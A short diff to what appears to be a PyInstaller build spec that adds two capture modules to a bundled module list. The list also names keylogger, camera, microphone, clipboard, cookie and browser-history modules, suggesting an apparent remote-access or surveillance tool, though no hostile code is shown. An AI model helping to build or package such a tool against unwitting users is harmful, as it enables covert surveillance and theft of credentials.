@@ -110,7 +110,7 @@ a = Analysis(
         # project modules
         'keylogger', 'screencap', 'controller', 'recorder',
         'camera', 'clipboard_monitor', 'microphone',
-        'relay_client', 'server',
+        'relay_client', 'server', 'fastcap_host', 'fastcap',
         'file_manager', 'processes', 'cookie_manager', 'browser_history',
         'windows_control', 'wintools', 'sysinfo',
         'privacy_screen', 'webview', 'webview.platforms.winforms',
